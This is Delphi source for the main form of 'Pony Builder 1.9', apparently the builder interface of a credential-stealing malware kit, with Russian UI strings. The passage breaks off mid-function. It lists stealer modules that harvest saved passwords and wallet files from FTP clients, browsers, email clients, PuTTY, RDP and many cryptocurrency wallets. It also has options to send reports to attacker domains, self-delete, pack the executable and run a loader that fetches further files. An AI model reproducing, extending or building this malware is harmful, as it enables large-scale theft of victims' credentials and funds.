unit Main;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, sSkinProvider, sSkinManager, ExtCtrls, sPanel, StdCtrls,
  sGroupBox, sEdit, sCheckBox, sLabel, sButton, ComCtrls, sPageControl,
  sMemo, Menus, Buttons, sBitBtn, sListView, ImgList, ShellAPI, sDialogs,
  IniFiles, Error, acAlphaImageList, sRadioButton, sSpinEdit, sHintManager;

type
  TMainForm = class(TForm)
    sSkinManager1: TsSkinManager;
    sSkinProvider1: TsSkinProvider;
    sPageControl1: TsPageControl;
    sTabSheet1: TsTabSheet;
    sTabSheet2: TsTabSheet;
    sGroupBox1: TsGroupBox;
    PackCheckBox: TsCheckBox;
    EncryptCheckBox: TsCheckBox;
    SaveReportCheckBox: TsCheckBox;
    BuildButton: TsButton;
    sGroupBox2: TsGroupBox;
    DomainList: TsMemo;
    sGroupBox3: TsGroupBox;
    DebugModeCheckBox: TsCheckBox;
    MainMenu: TMainMenu;
    File1: TMenuItem;
    ExitMainMenu: TMenuItem;
    Help1: TMenuItem;
    AboutMainMenu: TMenuItem;
    HelpMainMenu: TMenuItem;
    SelfDeleteCheckBox: TsCheckBox;
    sLabel1: TsLabel;
    PasswordEdit: TsEdit;
    sDecryptList: TsGroupBox;
    ModuleListView: TsListView;
    FTPImageList: TImageList;
    OpenDialog: TsOpenDialog;
    FileIcon: TImage;
    SelectFileIconButton: TsButton;
    sTabSheet3: TsTabSheet;
    SkinListView: TsListView;
    AddIconCheckBox: TsCheckBox;
    ModuleListPopupMenu: TPopupMenu;
    SelectAllMenuItem: TMenuItem;
    CleartAllMenuItem: TMenuItem;
    UPXCheckBox: TsCheckBox;
    SendEmptyReportsCheckBox: TsCheckBox;
    MainMenuImageList: TsAlphaImageList;
    ShowAdvancedOptionsMenuItem: TMenuItem;
    sTabSheet4: TsTabSheet;
    sGroupBox4: TsGroupBox;
    LoaderList: TsMemo;
    SendModifiedCheckBox: TsCheckBox;
    sModeGroupBox: TsGroupBox;
    ExeModeCheckBox: TsRadioButton;
    DllModeCheckBox: TsRadioButton;
    UploadRetriesEdit: TsDecimalSpinEdit;
    CollectHTTPPasswordsCheckBox: TsCheckBox;
    sLabel2: TsLabel;
    CollectEmailPasswordsCheckBox: TsCheckBox;
    BuildWithExeRelocsCheckBox: TsCheckBox;
    sHintManager1: TsHintManager;
    sGroupBox5: TsGroupBox;
    ReserveLoaderModeCheckBox: TsCheckBox;
    LoaderDupeCheckbox: TsCheckBox;
    ActivateLoaderCheckBox: TsCheckBox;
    sGroupBox6: TsGroupBox;
    DisableGrabberCheckBox: TsCheckBox;
    procedure WMGetMinMaxInfo( var Message :TWMGetMinMaxInfo ); message WM_GETMINMAXINFO;
    procedure ExitMainMenuClick(Sender: TObject);
    procedure AboutMainMenuClick(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure ModuleListViewDblClick(Sender: TObject);
    procedure HelpMainMenuClick(Sender: TObject);
    procedure SelectFileIconButtonClick(Sender: TObject);
    procedure BuildButtonClick(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure SkinListViewDblClick(Sender: TObject);
    procedure SelectAllMenuItemClick(Sender: TObject);
    procedure CleartAllMenuItemClick(Sender: TObject);
    procedure ShowAdvancedOptionsMenuItemClick(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
    procedure SkinListViewKeyPress(Sender: TObject; var Key: Char);
    procedure ExeModeCheckBoxClick(Sender: TObject);
    procedure DllModeCheckBoxClick(Sender: TObject);
    procedure EncryptCheckBoxClick(Sender: TObject);
    procedure ActivateLoaderCheckBoxClick(Sender: TObject);
    procedure DisableGrabberCheckBoxClick(Sender: TObject);
  private
    FCommandLineMode: Boolean;
    FConsoleAttached: Boolean;
    procedure AddListItem(const ModuleName, Caption, Icon: String; ResName: String = ''; Masked: Boolean = True; MaskColor: TColor = -2);
    procedure SaveSettings;
    procedure LoadSettings;
    procedure PopulateSkinList;
    procedure RedrawAdvancedItems;
    procedure ProcessCommandLine;
    procedure ConsoleMessageBox(Handle: THandle; Msg, Caption: PChar; Flags: LongWord);
  end;

var
  MainForm: TMainForm;
  AppDir: String;
  ModuleFileSize: TStringList;

const
  CPonyIniFile = 'Pony.ini';
  CVer = '1.9';

implementation

{$R *.dfm}

procedure ExecConsoleApp(CommandLine: String; Output: TStringList; Errors: TStringList);
var
  sa: TSECURITYATTRIBUTES;
  si: TSTARTUPINFO;
  pi: TPROCESSINFORMATION;
  hPipeOutputRead: THANDLE;
  hPipeOutputWrite: THANDLE;
  hPipeErrorsRead: THANDLE;
  hPipeErrorsWrite: THANDLE;
  Res, bTest: Boolean;
  env: array[0..100] of Char;
  szBuffer: array[0..256] of Char;
  dwNumberOfBytesRead: DWORD;
  Stream: TStringStream;
  AOemString: AnsiString;
begin
  FillChar(sa, sizeof(sa), 0);
  sa.nLength := sizeof(sa);
  sa.bInheritHandle := true;
  sa.lpSecurityDescriptor := nil;
  CreatePipe(hPipeOutputRead, hPipeOutputWrite, @sa, 0);
  CreatePipe(hPipeErrorsRead, hPipeErrorsWrite, @sa, 0);
  ZeroMemory(@env, SizeOf(env));
  ZeroMemory(@si, SizeOf(si));
  ZeroMemory(@pi, SizeOf(pi));
  si.cb := SizeOf(si);
  si.dwFlags := STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES;
  si.wShowWindow := SW_HIDE;
  si.hStdInput := 0;
  si.hStdOutput := hPipeOutputWrite;
  si.hStdError := hPipeErrorsWrite;

  (* Remember that if you want to execute an app with no parameters you nil the
     second parameter and use the first, you can also leave it as is with no
     problems.                                                                 *)
  Res := CreateProcess(nil, PChar(CommandLine), nil, nil, true,
    CREATE_NEW_CONSOLE or NORMAL_PRIORITY_CLASS, @env, nil, si, pi);

  // Procedure will exit if CreateProcess fail
  if not Res then  begin
    CloseHandle(hPipeOutputRead);
    CloseHandle(hPipeOutputWrite);
    CloseHandle(hPipeErrorsRead);
    CloseHandle(hPipeErrorsWrite);
    Exit;
  end;
  CloseHandle(hPipeOutputWrite);
  CloseHandle(hPipeErrorsWrite);

  //Read output pipe
  Stream := TStringStream.Create;
  try
    while True do begin
      FillChar(szBuffer, SizeOf(szBuffer), 0);
      bTest := ReadFile(hPipeOutputRead, szBuffer[0], SizeOf(szBuffer)-1, dwNumberOfBytesRead,
        nil);
      if not bTest then
        Break;
      Stream.Write(szBuffer[0], dwNumberOfBytesRead);
    end;
    Stream.Position := 0;
    AOemString := AnsiString(Stream.DataString);
    OemToAnsi(@AOemString[1], @AOemString[1]);
    Output.Text := String(AOemString);
  finally
    Stream.Free;
  end;

  //Read error pipe
  Stream := TStringStream.Create;
  try
    while True do begin
      FillChar(szBuffer, SizeOf(szBuffer), 0);
      bTest := ReadFile(hPipeErrorsRead, szBuffer[0], SizeOf(szBuffer)-1, dwNumberOfBytesRead,
        nil);
      if not bTest then
        Break;
      Stream.Write(szBuffer[0], dwNumberOfBytesRead);
    end;
    Stream.Position := 0;
    AOemString := AnsiString(Stream.DataString);
    OemToAnsi(@AOemString[1], @AOemString[1]);
    Errors.Text := String(AOemString);
  finally
    Stream.Free;
  end;

  WaitForSingleObject(pi.hProcess, INFINITE);
  CloseHandle(pi.hProcess);
  CloseHandle(hPipeOutputRead);
  CloseHandle(hPipeErrorsRead);
end;

function IconIndex(ImageList: TCustomImageList; const Icon: String): Integer;
var
  i: Integer;
  List: TList;
begin
  Result := -1;
  if (ImageList = nil) or (ImageList.Tag = 0) then Exit;
  List := TList(ImageList.Tag);
  for i := 0 to List.Count-1 do
    if PString(List.Items[i])^ = Icon then begin
      Result := i;
      Exit;
    end;
end;

function IconAssign(ImageList: TCustomImageList; const Icon: String; Handle: THandle; Masked: Boolean = True; MaskColor: TColor = -2): Integer;
var
  i: Integer;
  List: TList;
  P: PString;
  c: TColor;
  Image: TBitmap;
begin
  if ImageList.Tag = 0 then ImageList.Tag := Integer(TList.Create);
  List := TList(ImageList.Tag);
  for i := 0 to List.Count-1 do
    if PString(List.Items[i])^ = Icon then begin
      Result := i;
      Exit;
    end;
  // Add new icon
  Result := List.Count;
  if Handle <> 0 then begin
    Image := TBitmap.Create;
    New(P);
    P^ := Icon;
    try
      Image.Handle := Handle;
      if Masked and (Handle <> 0) then begin
        if (MaskColor = -2) and (Image.Width > 0) and (Image.Height > 0) then begin
          c := Image.Canvas.Pixels[0, 0];
          ImageList.AddMasked(Image, c);
        end else
          ImageList.AddMasked(Image, MaskColor);
      end else
        ImageList.Add(Image, nil);
      List.Add(P);
    except
      Dispose(P);
      Result := -1;
    end;
    Image.Free;
  end;
end;

function IconAssignFromRes(ImageList: TCustomImageList; const Icon: String; ResName: String = ''; Masked: Boolean = True; MaskColor: TColor = -2): Integer;
var
  B: TBitmap;
begin
  if ResName = '' then ResName := Icon;
  Result := IconIndex(ImageList, Icon);
  if Result <> -1 then Exit;
  B := TBitmap.Create;
  try
    B.LoadFromResourceName(0, ResName);
    if B.Handle <> 0 then
      Result := IconAssign(ImageList, Icon, B.Handle, Masked, MaskColor);
  finally
    B.Free;
  end;
end;

{ TMainForm }

procedure TMainForm.WMGetMinMaxInfo(var Message: TWMGetMinMaxInfo);
begin
  with Message.MinMaxInfo^ do
  begin
    ptMinTrackSize.X := 525;           {Minimum width}
    ptMinTrackSize.Y := 490;           {Minimum height}
  end;
  Message.Result := 0;                 {Tell windows you have changed minmaxinfo}
  inherited;
end;

procedure TMainForm.EncryptCheckBoxClick(Sender: TObject);
begin
  PasswordEdit.Enabled := TCheckBox(Sender).Checked;

end;

procedure TMainForm.ExeModeCheckBoxClick(Sender: TObject);
begin
  BuildWithExeRelocsCheckBox.Enabled := True;
end;

procedure TMainForm.ExitMainMenuClick(Sender: TObject);
begin
  Close;
end;

procedure TMainForm.AboutMainMenuClick(Sender: TObject);
begin
  MessageBox(Handle, PChar('Pony Builder, версия ' + CVer + '.'), 'О программе', MB_ICONINFORMATION);
end;

procedure TMainForm.ActivateLoaderCheckBoxClick(Sender: TObject);
begin
  LoaderList.Enabled := TCheckBox(Sender).Checked;
end;

procedure TMainForm.AddListItem(const ModuleName, Caption, Icon: String; ResName: String = ''; Masked: Boolean = True; MaskColor: TColor = -2);
var
  item: TListItem;
  index: Integer;
  P: PString;
begin
  New(P);
  P^ := ModuleName;
  index := IconAssignFromRes(FTPImageList, Icon, ResName, Masked, MaskColor);
  item := ModuleListView.Items.Add;
  item.Data := P;
  item.Caption := Caption;
  item.ImageIndex := index;
  item.Checked := True;
  item.SubItems.Add('1.0');
  if ModuleFileSize.Values[ModuleName] <> '' then
    item.SubItems.Add(ModuleFileSize.Values[ModuleName] + ' байт');
end;

procedure TMainForm.PopulateSkinList;
var
  sl : TStringList;
  i : integer;
begin
  sl := TStringList.Create;
  sSkinManager1.GetSkinNames(sl);
  SkinListView.Items.BeginUpdate;
  SkinListView.Clear;
  for i := 0 to sl.Count - 1 do
    SkinListView.Items.Add.Caption := sl[i];
  SkinListView.Items.EndUpdate;
  // If there are no available skins...
  if SkinListView.Items.Count < 1 then SkinListView.Items.Add.Caption := 'Скинов нет';
  FreeAndNil(sl);
end;

procedure TMainForm.FormCreate(Sender: TObject);
var
  file_icon: TIcon;
begin
  FCommandLineMode := False;
  Caption := 'Pony Builder ' + CVer;

  ModuleFileSize := TStringList.Create;

  {$I ModuleSize.inc}

  AppDir := ExtractFilePath(ParamStr(0));

  file_icon := TIcon.Create;
  if FileExists(AppDir + 'Pony.ico') then begin
    try
      file_icon.LoadFromFile(AppDir + 'Pony.ico');
      FileIcon.Picture.Graphic := file_icon;
    except
    end;
  end;
  FreeAndNil(file_icon);

  AddListItem('MODULE_FAR', 'FAR Manager', 'PIC_FAR', '', False);
  AddListItem('MODULE_WTC', 'Total Commander', 'PIC_WTC', '', False);
  AddListItem('MODULE_WS_FTP', 'WS_FTP', 'PIC_WS_FTP');
  AddListItem('MODULE_CUTEFTP', 'CuteFTP', 'PIC_CUTEFTP');
  AddListItem('MODULE_FLASHFXP', 'FlashFXP', 'PIC_FLASHFXP');
  AddListItem('MODULE_FILEZILLA', 'FileZilla', 'PIC_FZILLA');
  AddListItem('MODULE_FTPCOMMANDER', 'FTP Commander', 'PIC_FTPCOMM');
  AddListItem('MODULE_BULLETPROOF', 'BulletProof FTP', 'PIC_BPROOF');
  AddListItem('MODULE_SMARTFTP', 'SmartFTP', 'PIC_SMARTFTP');
  AddListItem('MODULE_TURBOFTP', 'TurboFTP', 'PIC_TURBOFTP');
  AddListItem('MODULE_FFFTP', 'FFFTP', 'PIC_FFFTP');
  AddListItem('MODULE_COFFEECUPFTP', 'CoffeeCup FTP / Sitemapper', 'PIC_COFFEE');
  AddListItem('MODULE_COREFTP', 'CoreFTP', 'PIC_COREFTP');
  AddListItem('MODULE_FTPEXPLORER', 'FTP Explorer', 'PIC_FTPEXPLORER');
  AddListItem('MODULE_FRIGATEFTP', 'Frigate3 FTP', 'PIC_FRIGATE3');
  AddListItem('MODULE_SECUREFX', 'SecureFX', 'PIC_SECUREFX');
  AddListItem('MODULE_ULTRAFXP', 'UltraFXP', 'PIC_ULTRAFXP');
  AddListItem('MODULE_FTPRUSH', 'FTPRush', 'PIC_FTPRUSH');
  AddListItem('MODULE_WEBSITEPUBLISHER', 'WebSitePublisher', 'PIC_WEBSITEPUBLISHER');
  AddListItem('MODULE_BITKINEX', 'BitKinex', 'PIC_BITKINEX', '', True, $f8e6fe);
  AddListItem('MODULE_EXPANDRIVE', 'ExpanDrive', 'PIC_EXPANDRIVE');
  AddListItem('MODULE_CLASSICFTP', 'ClassicFTP', 'PIC_CLASSICFTP', '', True, $f8e6fe);
  AddListItem('MODULE_FLING', 'Fling', 'PIC_FLING', '', False);
  AddListItem('MODULE_SOFTX', 'SoftX', 'PIC_SOFTX');
  AddListItem('MODULE_DIRECTORYOPUS', 'Directory Opus', 'PIC_DOPUS');
  AddListItem('MODULE_FREEFTP', 'FreeFTP / DirectFTP', 'PIC_FREEFTP');
  AddListItem('MODULE_LEAPFTP', 'LeapFTP', 'PIC_LEAPFTP');
  AddListItem('MODULE_WINSCP', 'WinSCP',  'PIC_WINSCP', '', True, 0);
  AddListItem('MODULE_32BITFTP', '32bit FTP', 'PIC_32BITFTP');
  AddListItem('MODULE_NETDRIVE', 'NetDrive', 'PIC_WEBDRIVE');
  AddListItem('MODULE_WEBDRIVE', 'WebDrive', 'PIC_FTPCONTROL');
  AddListItem('MODULE_FTPCONTROL', 'FTP Control', 'PIC_NETDRIVE');
  AddListItem('MODULE_OPERA', 'Opera', 'PIC_OPERA');
  AddListItem('MODULE_WISEFTP', 'WiseFTP', 'PIC_WISEFTP');
  AddListItem('MODULE_FTPVOYAGER', 'FTP Voyager', 'PIC_FTPVOYAGER', '', False);
  AddListItem('MODULE_FIREFOX', 'Firefox', 'PIC_FIREFOX');
  AddListItem('MODULE_FIREFTP', 'FireFTP', 'PIC_FIREFTP');
  AddListItem('MODULE_SEAMONKEY', 'SeaMonkey', 'PIC_SEAMONKEY');
  AddListItem('MODULE_FLOCK', 'Flock', 'PIC_FLOCK');
  AddListItem('MODULE_MOZILLA', 'Mozilla', 'PIC_MOZILLA');
  AddListItem('MODULE_LEECHFTP', 'LeechFTP', 'PIC_LEECHFTP');
  AddListItem('MODULE_ODIN', 'Odin Secure FTP Expert', 'PIC_ODIN', '', False);
  AddListItem('MODULE_WINFTP', 'WinFTP', 'PIC_WINFTP');
  AddListItem('MODULE_FTP_SURFER', 'FTP Surfer', 'PIC_FTP_SURFER');
  AddListItem('MODULE_FTPGETTER', 'FTPGetter', 'PIC_FTPGETTER');
  AddListItem('MODULE_ALFTP', 'ALFTP', 'PIC_ALFTP');
  AddListItem('MODULE_IE', 'Internet Explorer', 'PIC_IE');
  AddListItem('MODULE_DREAMWEAVER', 'Dreamweaver', 'PIC_DREAMWEAVER', '', False);
  AddListItem('MODULE_DELUXEFTP', 'DeluxeFTP', 'PIC_DELUXEFTP', '', True, $f0f0f0);
  AddListItem('MODULE_CHROME', 'Google Chrome', 'PIC_CHROME');
  AddListItem('MODULE_CHROMIUM', 'Chromium / SRWare Iron', 'PIC_CHROMIUM');
  AddListItem('MODULE_CHROMEPLUS', 'ChromePlus', 'PIC_CHROMEPLUS');
  AddListItem('MODULE_BROMIUM', 'Bromium (Yandex Chrome)', 'PIC_BROMIUM');
  AddListItem('MODULE_NICHROME', 'Nichrome', 'PIC_NICHROME');
  AddListItem('MODULE_COMODODRAGON', 'Comodo Dragon', 'PIC_COMODODRAGON');
  AddListItem('MODULE_ROCKMELT', 'RockMelt', 'PIC_ROCKMELT');
  AddListItem('MODULE_KMELEON', 'K-Meleon', 'PIC_KMELEON');
  AddListItem('MODULE_EPIC', 'Epic', 'PIC_EPIC');
  AddListItem('MODULE_STAFF', 'Staff-FTP', 'PIC_STAFF');  
  AddListItem('MODULE_ACEFTP', 'AceFTP', 'PIC_ACEFTP');  
  AddListItem('MODULE_GLOBALDOWNLOADER', 'Global Downloader', 'PIC_GLOBALDOWNLOADER');  
  AddListItem('MODULE_FRESHFTP', 'FreshFTP', 'PIC_FRESHFTP');
  AddListItem('MODULE_BLAZEFTP', 'BlazeFTP', 'PIC_BLAZEFTP');
  AddListItem('MODULE_NETFILE', 'NETFile', 'PIC_NETFILE', '', False);
  AddListItem('MODULE_GOFTP', 'GoFTP', 'PIC_GOFTP');
  AddListItem('MODULE_3DFTP', '3D-FTP', 'PIC_3DFTP');
  AddListItem('MODULE_EASYFTP', 'Easy FTP', 'PIC_EASYFTP');
  AddListItem('MODULE_XFTP', 'Xftp', 'PIC_XFTP');
  AddListItem('MODULE_RDP', 'RDP', 'PIC_RDP');
  AddListItem('MODULE_FTPNOW', 'FTP Now', 'PIC_FTPNOW');
  AddListItem('MODULE_ROBOFTP', 'Robo-FTP', 'PIC_ROBOFTP');
  AddListItem('MODULE_CERT', 'Certificate', 'PIC_CERT');
  AddListItem('MODULE_LINASFTP', 'LinasFTP', 'PIC_LINASFTP');
  AddListItem('MODULE_CYBERDUCK', 'Cyberduck', 'PIC_CYBERDUCK');
  AddListItem('MODULE_PUTTY', 'Putty', 'PIC_PUTTY', '', False);
  AddListItem('MODULE_NOTEPADPP', 'Notepad++', 'PIC_NOTEPADPP', '', True, 0);
  AddListItem('MODULE_VS_DESIGNER', 'CoffeeCup Visual Site Designer', 'PIC_VS_DESIGNER');
  AddListItem('MODULE_FTPSHELL', 'FTPShell', 'PIC_FTPSHELL', '', False);
  AddListItem('MODULE_FTPINFO', 'FTPInfo', 'PIC_FTPINFO', '', False);
  AddListItem('MODULE_NEXUSFILE', 'NexusFile', 'PIC_NEXUSFILE');
  AddListItem('MODULE_FS_BROWSER', 'FastStone Browser', 'PIC_FS_BROWSER');
  AddListItem('MODULE_COOLNOVO', 'CoolNovo', 'PIC_CHROMEPLUS');
  AddListItem('MODULE_WINZIP', 'WinZip', 'PIC_WINZIP');
  AddListItem('MODULE_YANDEXINTERNET', 'Yandex.Internet / Я.Браузер', 'PIC_YANDEXINTERNET');
  AddListItem('MODULE_MYFTP', 'MyFTP', 'PIC_MYFTP');
  AddListItem('MODULE_SHERRODFTP', 'sherrod FTP', 'PIC_SHERRODFTP');
  AddListItem('MODULE_NOVAFTP', 'NovaFTP', 'PIC_NOVAFTP');
  AddListItem('MODULE_WINDOWS_MAIL', 'Windows Mail', 'PIC_WINDOWS_MAIL');
  AddListItem('MODULE_WINDOWS_LIVE_MAIL', 'Windows Live Mail', 'PIC_WINDOWS_LIVE_MAIL');
  AddListItem('MODULE_BECKY', 'Becky!', 'PIC_BECKY');
  AddListItem('MODULE_POCOMAIL', 'Pocomail', 'PIC_POCOMAIL');
  AddListItem('MODULE_INCREDIMAIL', 'IncrediMail', 'PIC_INCREDIMAIL');
  AddListItem('MODULE_THEBAT', 'The Bat!', 'PIC_THEBAT', '', False);
  AddListItem('MODULE_OUTLOOK', 'Outlook', 'PIC_OUTLOOK');
  AddListItem('MODULE_THUNDERBIRD', 'Thunderbird', 'PIC_THUNDERBIRD');
  AddListItem('MODULE_FASTTRACK', 'FastTrackFTP', 'PIC_FTPCOMM');
  AddListItem('MODULE_BITCOIN', 'Bitcoin', 'PIC_BITCOIN');
  AddListItem('MODULE_ELECTRUM', 'Electrum', 'PIC_ELECTRUM');
  AddListItem('MODULE_MULTIBIT', 'MultiBit', 'PIC_MULTIBIT');
  AddListItem('MODULE_FTPDISK', 'FTP Disk', 'PIC_FTPDISK');
  AddListItem('MODULE_LITECOIN', 'Litecoin', 'PIC_LITECOIN');
  AddListItem('MODULE_NAMECOIN', 'Namecoin', 'PIC_NAMECOIN');
  AddListItem('MODULE_TERRACOIN', 'Terracoin', 'PIC_TERRACOIN');
  AddListItem('MODULE_BITCOINARMORY', 'Bitcoin Armory', 'PIC_BITCOIN_ARMORY');
  AddListItem('MODULE_PPCOIN', 'PPCoin (Peercoin)', 'PIC_PPCOIN');
  AddListItem('MODULE_PRIMECOIN', 'Primecoin', 'PIC_PRIMECOIN');
  AddListItem('MODULE_FEATHERCOIN', 'Feathercoin', 'PIC_FEATHERCOIN');
  AddListItem('MODULE_NOVACOIN', 'NovaCoin', 'PIC_NOVACOIN');
  AddListItem('MODULE_FREICOIN', 'Freicoin', 'PIC_FREICOIN');
  AddListItem('MODULE_FRANKOCOIN', 'Frankocoin', 'PIC_FRANKOCOIN');
  AddListItem('MODULE_DEVCOIN', 'Devcoin', 'PIC_DEVCOIN');
  AddListItem('MODULE_PROTOSHARES', 'ProtoShares', 'PIC_PROTOSHARES', '', False);
  AddListItem('MODULE_MEGACOIN', 'MegaCoin', 'PIC_MEGACOIN');
  AddListItem('MODULE_QUARKCOIN', 'Quarkcoin', 'PIC_QUARKCOIN');
  AddListItem('MODULE_WORLDCOIN', 'Worldcoin', 'PIC_WORLDCOIN');
  AddListItem('MODULE_INFINITECOIN', 'Infinitecoin', 'PIC_INFINITECOIN');
  AddListItem('MODULE_IXCOIN', 'Ixcoin', 'PIC_IXCOIN');
  AddListItem('MODULE_ANONCOIN', 'Anoncoin', 'PIC_ANONCOIN');
  AddListItem('MODULE_BBQCOIN', 'BBQcoin', 'PIC_BBQCOIN');
  AddListItem('MODULE_DIGITALCOIN', 'Digitalcoin', 'PIC_DIGITALCOIN');
  AddListItem('MODULE_MINCOIN', 'Mincoin', 'PIC_MINCOIN');
  AddListItem('MODULE_GOLDCOIN', 'Goldcoin', 'PIC_GOLDCOIN');
  AddListItem('MODULE_YACOIN', 'Yacoin', 'PIC_YACOIN');
  AddListItem('MODULE_ZETACOIN', 'Zetacoin', 'PIC_ZETACOIN');
  AddListItem('MODULE_FASTCOIN', 'Fastcoin', 'PIC_FASTCOIN');
  AddListItem('MODULE_I0COIN', 'I0coin', 'PIC_BITCOIN');
  AddListItem('MODULE_TAGCOIN', 'Tagcoin', 'PIC_TAGCOIN');
  AddListItem('MODULE_BYTECOIN', 'Bytecoin', 'PIC_BYTECOIN');
  AddListItem('MODULE_FLORINCOIN', 'Florincoin', 'PIC_FLORINCOIN');
  AddListItem('MODULE_PHOENIXCOIN', 'Phoenixcoin', 'PIC_PHOENIXCOIN');
  AddListItem('MODULE_LUCKYCOIN', 'Luckycoin', 'PIC_LUCKYCOIN');
  AddListItem('MODULE_CRAFTCOIN', 'Craftcoin', 'PIC_CRAFTCOIN');
  AddListItem('MODULE_JUNKCOIN', 'Junkcoin', 'PIC_JUNKCOIN');

  // Command line mode
  if ParamCount > 0 then begin
    ProcessCommandLine;
    ExitProcess(0);
  end;
    
  PopulateSkinList;
  LoadSettings;
end;

procedure TMainForm.ModuleListViewDblClick(Sender: TObject);
begin
  if TsListView(ModuleListView).Selected <> nil then
    TsListView(ModuleListView).Selected.Checked := not TsListView(ModuleListView).Selected.Checked;
end;

procedure TMainForm.HelpMainMenuClick(Sender: TObject);
begin
  ShellExecute(Handle, 'open', 'Help.txt', nil, nil, SW_SHOWNORMAL);
end;

procedure TMainForm.SelectFileIconButtonClick(Sender: TObject);
var
  file_icon: TIcon;
  S: String;
begin
  file_icon := TIcon.Create;
  S := GetCurrentDir;
  with OpenDialog do begin
    if (Execute) and (Files.Count > 0) then begin
      try
        if AnsiLowerCase(ExtractFileExt(Files[0])) = '.ico' then
          file_icon.LoadFromFile(Files[0])
        else
          file_icon.Handle := ExtractIcon(Application.Handle, PChar(Files[0]), 0);

        if file_icon.Handle <> 0 then begin
          try
            FileIcon.Picture.Graphic := file_icon;
            FileIcon.Picture.Graphic.SaveToFile(AppDir + 'Pony.ico');
            AddIconCheckBox.Checked := True;
          except
            MessageBox(Handle, 'Невозможно сохранить иконку!', 'Ошибка!', MB_ICONERROR);
            FileIcon.Picture.Bitmap := nil;
          end;
        end else begin
          MessageBox(Handle, 'Невозможно загрузить иконку!', 'Ошибка!', MB_ICONERROR);
          FileIcon.Picture.Bitmap := nil;
        end;
      except
        MessageBox(Handle, 'Невозможно загрузить иконку!', 'Ошибка!', MB_ICONERROR);
        FileIcon.Picture.Bitmap := nil;
      end;
    end;
  end;
  FreeAndNil(file_icon);
  SetCurrentDir(S);
end;

procedure xCloseFile(var FHandle: THandle);
begin
  if FHandle <> INVALID_HANDLE_VALUE then
    CloseHandle(FHandle);
  FHandle := INVALID_HANDLE_VALUE;
end;

function xOpenFile(var FHandle: THandle; const FileName: String): Boolean;
begin
  Result := False;
  if not FileExists(FileName) then Exit;
  FHandle := CreateFile(PChar(FileName), GENERIC_READ, FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_EXISTING, 0, 0);
  if FHandle = INVALID_HANDLE_VALUE then Exit;
  if SetFilePointer(FHandle, 0, nil, 0) = LongWord(-1) then begin
    xCloseFile(FHandle);
    Exit;
  end;
  Result := True;
end;

function xGetFileSize(const FileName: String): LongWord;
var
  FHandle: THandle;
begin
  Result := 0;
  if not xOpenFile(FHandle, FileName) then Exit;
  Result := GetFileSize(FHandle, nil);
  xCloseFile(FHandle);
  if Result = $FFFFFFFF then
    Result := 0;
end;

function StrBegins(const Str, SubStr: String): Boolean;
begin
  Result := Copy(Str, 1, Length(SubStr)) = SubStr;
end;

var
  AttachConsole: function(dwProcessId: LongWord): Bool; stdcall;

procedure TMainForm.ProcessCommandLine;
var
  i, j: Integer;
  S: String;
  Pass: String;
  module_found: Boolean;
begin
  FCommandLineMode := True;

  AttachConsole := GetProcAddress(LoadLibrary('kernel32.dll'), 'AttachConsole');
  if (@AttachConsole = nil) or (not AttachConsole($FFFFFFFF)) then
    FConsoleAttached := False
  else
    FConsoleAttached := True;

  // Show greeting message
  if FConsoleAttached then begin
    Write('Pony ', CVer);
    Writeln;
  end;

  for i := 1 to ParamCount do begin
    if ParamStr(i) = '-COLLECT_HTTP' then
      Self.CollectHTTPPasswordsCheckBox.Checked := True
    else if ParamStr(i) = '-COLLECT_EMAIL' then
      Self.CollectEmailPasswordsCheckBox.Checked := True
    else if ParamStr(i) = '-DLL_MODE' then
      Self.DllModeCheckBox.Checked := True
    else if ParamStr(i) = '-PACK_REPORT' then begin
      Self.PackCheckBox.Checked := True;
    end else if ParamStr(i) = '-ENCRYPT_REPORT' then begin
      Self.EncryptCheckBox.Checked := True;
    end else if ParamStr(i) = '-SAVE_REPORT' then begin
      Self.SaveReportCheckBox.Checked := True;
    end else if ParamStr(i) = '-ENABLE_DEBUG_MODE' then begin
      Self.DebugModeCheckBox.Checked := True;
    end else if ParamStr(i) = '-SEND_MODIFIED_ONLY' then begin
      Self.SendModifiedCheckBox.Checked := True;
    end else if ParamStr(i) = '-SELF_DELETE' then begin
      Self.SelfDeleteCheckBox.Checked := True;
    end else if ParamStr(i) = '-SEND_EMPTY_REPORTS' then begin
      Self.SendEmptyReportsCheckBox.Checked := True;
    end else if ParamStr(i) = '-UPX' then begin
      Self.UPXCheckBox.Checked := True;
    end else if ParamStr(i) = '-EXE_RELOCS' then begin
      Self.BuildWithExeRelocsCheckBox.Checked := True;
    end else if ParamStr(i) = '-LOADER_RESERVE_MODE' then begin
      Self.ReserveLoaderModeCheckBox.Checked := True;
    end else if StrBegins(ParamStr(i), '-UPLOAD_RETRIES=') then begin
      S := ParamStr(i);
      Delete(S, 1, Length('-UPLOAD_RETRIES='));
      try
        UploadRetriesEdit.Text := IntToStr(StrToInt(S));
      except
      end;
    end else if StrBegins(ParamStr(i), '-DOMAIN_LIST=') then begin
      S := ParamStr(i);
      Delete(S, 1, Length('-DOMAIN_LIST='));
      S := StringReplace(S, '\n', #13#10, [rfReplaceAll]);
      DomainList.Text := S;
    end else if StrBegins(ParamStr(i), '-REPORT_PASSWORD=') then begin
      S := ParamStr(i);
      Delete(S, 1, Length('-REPORT_PASSWORD='));
      Pass := S;
    end else if StrBegins(ParamStr(i), '-ADD_ICON') then begin
      Self.AddIconCheckBox.Checked := True;
    end else if StrBegins(ParamStr(i), '-LOADER_EXECUTE_NEW_FILES_ONLY') then begin
      Self.LoaderDupeCheckbox.Checked := True;
    end else if StrBegins(ParamStr(i), '-DISABLE_GRABBER') then begin
      Self.DisableGrabberCheckBox.Checked := True;
    end else if StrBegins(ParamStr(i), '-LOADER_LIST=') then begin
      S := ParamStr(i);
      Delete(S, 1, Length('-LOADER_LIST='));
      S := StringReplace(S, '\n', #13#10, [rfReplaceAll]);
      LoaderList.Text := S;
      Self.ActivateLoaderCheckBox.Checked := True;
    end else if StrBegins(ParamStr(i), '-DISABLE_MODULE=') then begin
      module_found := False;
      S := ParamStr(i);
      Delete(S, 1, Length('-DISABLE_MODULE='));
      for j := 0 to ModuleListView.Items.Count-1 do begin
        if PString(ModuleListView.Items[j].Data)^ = S then begin
          ModuleListView.Items[j].Checked := False;
          module_found := True;
        end;
      end;
      if not module_found then begin
